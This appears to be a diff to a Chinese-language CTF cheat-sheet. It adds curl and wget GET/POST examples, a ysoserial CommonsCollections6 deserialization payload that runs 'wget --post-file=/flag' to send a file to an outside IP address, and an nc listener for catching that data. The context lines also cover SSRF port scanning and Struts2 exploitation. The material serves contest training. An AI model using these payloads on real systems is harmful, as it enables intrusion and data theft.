@@ -234,6 +234,86 @@ find / -type f 2>/dev/null | grep -Ei 'flag'
 find / -type f 2>/dev/null | grep -Ei 'f{1,5}l{1,5}a{1,5}g{1,5}'
 ```
 
+#### curl
+
+**GET 方法**
+
+```bash
+curl http://example.com
+```
+
+**GET 方法带参数**
+
+```bash
+curl "http://example.com?param1=value1&param2=value2"
+```
+
+**POST 方法**
+
+```bash
+curl -X POST http://example.com
+```
+
+**POST 方法带参数**
+
+```bash
+curl -X POST -d "param1=value1&param2=value2" http://example.com
+```
+
+或者，如果参数较多，可以将参数放入一个文件中，然后使用 `@` 指定该文件：
+
+```bash
+curl -X POST -d @data.txt http://example.com
+```
+
+其中 `data.txt` 的内容可能如下：
+
+```
+param1=value1
+param2=value2
+```
+
+#### wget
+
+**GET 方法**
+
+```bash
+wget http://example.com
+```
+
+**GET 方法带参数**
+
+```bash
+wget "http://example.com?param1=value1&param2=value2"
+```
+
+wget 并不直接支持 POST 请求，但你可以使用 `--post-data` 或 `--post-file` 选项来发送 POST 请求。以下是一些示例：
+
+**POST 方法**
+
+```bash
+wget --post-data="" http://example.com
+```
+
+**POST 方法带参数**
+
+```bash
+wget --post-data="param1=value1&param2=value2" http://example.com
+```
+
+或者，如果参数较多，可以将参数放入一个文件中，然后使用 `--post-file` 指定该文件：
+
+```bash
+wget --post-file=data.txt http://example.com
+```
+
+其中 `data.txt` 的内容可能如下：
+
+```
+param1=value1
+param2=value2
+```
+
 ## 端口扫描
 
 - PHP 中直接使用 `dict` 协议扫描端口，如 `?url=dict://127.0.0.1:80` ，如果响应 404，说明该端口开启，再访问 `?url=http://127.0.0.1` 即可【该方法可以利用 `127.0.0.1` 的权限扫描端口，因为端口未必是只对外界开放的，有的端口在 `127.0.0.1` 中，CTF 考题一般只能这样考】
@@ -3305,6 +3385,18 @@ $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -d name=admin
 $ python3 Struts2Scan.py -u http://192.168.100.8:8080/index.action -n S2-016 --exec
 ```
 
+#### ysoserial
+
+打反序列化工具
+
+##### 数据外带
+
+```bash
+java -jar ysoserial-all.jar CommonsCollections6 "wget --post-file=/flag 144.34.181.239:10008" | base64 -w0
+```
+
+`CommonsCollections6` 这里可以自己试，输入 `java -jar ysoserial-all.jar` 查看所有 Payload
+
 #### Java 理论
 
 ##### Java Web 项目目录结构
@@ -3401,7 +3493,7 @@ web应用部署的根目录就是webapp目录（当然你的目录可能叫web�
 
 ### URL 外带数据
 
-- 有时候比赛环境是内网，直接在本地使用 `nc` 开监听即可
+- 有时候比赛环境是内网，直接在本地使用 `nc` 开监听即可(如 `nc -lvnp 10008` [可以监听 HTTP 请求])
 
 1.首先进入数据转发网站 http://requestbin.cn/ ，创建一个 RequestBin
 
